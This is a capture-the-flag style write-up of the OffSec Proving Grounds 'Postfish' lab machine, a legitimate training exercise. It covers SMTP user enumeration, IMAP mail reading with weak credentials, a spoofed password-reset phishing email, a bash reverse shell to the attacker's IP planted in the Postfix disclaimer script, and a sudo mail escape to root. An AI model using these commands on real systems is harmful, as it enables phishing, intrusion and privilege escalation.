---
title: "Proving grounds Practice: Potfish"
layout: post
date: 2024-05-20 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- SMTP
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP
```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp  open  http Apache httpd 2.4.41 ((Ubuntu))
Nothing here...

Create custom wordlist based on the texts in the webpage

```sh
cewl http://postfish.off/team.html -m 5 -w team.txt
```

## 25/tcp  open  smtp Postfix smtpd

Enumerate snmp users

```sh
smtp-user-enum -U team.txt -t 192.168.228.137
######## Scan started at Sat Oct 28 07:50:55 2023 #########
192.168.228.137: Sales exists
192.168.228.137: Legal exists
######## Scan completed at Sat Oct 28 07:51:11 2023 #########
2 results.
```

### Usernames found

Sales
Legal

**Users in the website**

Claire Madison
Mike Ross
Brian Moore
Sarah Lorem

**Common email naming**

claire.madison@postfish.off
mike.ross@postfish.off
brian.moore@postfish.off
sarah.lorem@postfish.off

```shell
naveenj@hackerspace:[08:01]~/proving_grounds/Postfish$ smtp-user-enum -U usr -t postfish.off
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... usr
Target count ............. 1
Username count ........... 8
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Oct 28 08:01:52 2023 #########
postfish.off: claire.madison@postfish.off exists
postfish.off: sarah.lorem exists
postfish.off: brian.moore exists
postfish.off: mike.ross exists
postfish.off: claire.madison exists
postfish.off: sarah.lorem@postfish.off exists
postfish.off: mike.ross@postfish.off exists
postfish.off: brian.moore@postfish.off exists
######## Scan completed at Sat Oct 28 08:01:54 2023 #########
8 results.

8 queries in 2 seconds (4.0 queries / sec)
```

The scan shows the users exist.

Check email messages using imap protocol by using curl

```sh
curl -k 'imaps://postfish.off/INBOX;MAILINDEX=1' --user sales:sales
```

```shell
naveenj@hackerspace:[08:16]~/proving_grounds/Postfish$ curl -k 'imaps://postfish.off/INBOX;MAILINDEX=1' --user sales:sales
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
	id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
	by postfish.off (Postfix) with SMTP id 7712145434
	for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
```

### Sending email using smtp

```shell
- Connect to port using netcat
nc -nv 192.168.209.137 25

- From address
MAIL FROM: it@postfish.off
250 2.1.0 Ok

- To address
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok

- Begin data
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Password reset process
Hi Brian,

Please follow this link to reset your password: http://192.168.45.205

regards,

-End data
.
250 2.0.0 Ok: queued as A6BCB4543F

- Exit
QUIT
221 2.0.0 Bye
```

![img](/assets/images/CTF/Proving_Grounds/Potfish/smtp.png)

Upon sending the link in the email they sent us the new password.

```shell
naveenj@hackerspace:[08:29]~/proving_grounds/Postfish$ nc -lvnp 80
listening on [any] 80 ...


connect to [192.168.45.205] from (UNKNOWN) [192.168.209.137] 53910
POST / HTTP/1.1
Host: 192.168.45.205
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

### url decoded

first_name=Brian&last_name=Moore&email=brian.moore%postfish.off&username=brian.moore&password=EternaLSunshinE&confifind/var/mail/-typef!-namesales-delete_password=EternaLSunshinE

### Credentials
brain.moore:EternaLSunshinE

## Privilege Escalation

Run linpeas.

```sh
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxrwx--- 1 root filter 1184 Oct 28 12:42 /etc/postfix/disclaimer
```

Add reverse shell to the disclaimer script file.

```sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.205/443 0>&1;
```

Repeat what we did for initial foothold. So whenever the system receives and sends any emails it will include the disclaimer content from a text file. And this script will be executed.

```shell
naveenj@hackerspace:[09:05]~/proving_grounds/Postfish$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.209.137] 47838
bash: cannot set terminal process group (31813): Inappropriate ioctl for device
bash: no job control in this shell
filter@postfish:/var/spool/postfix$ sudo -l
sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

### GTFO Bins Exploit

```sh
sudo mail --exec='!/bin/bash'
```

## Exploitation

```shell
filter@postfish:/var/spool/postfix$ sudo mail --exec='!/bin/sh'
sudo mail --exec='!/bin/sh'
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

**Root Obtained**

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).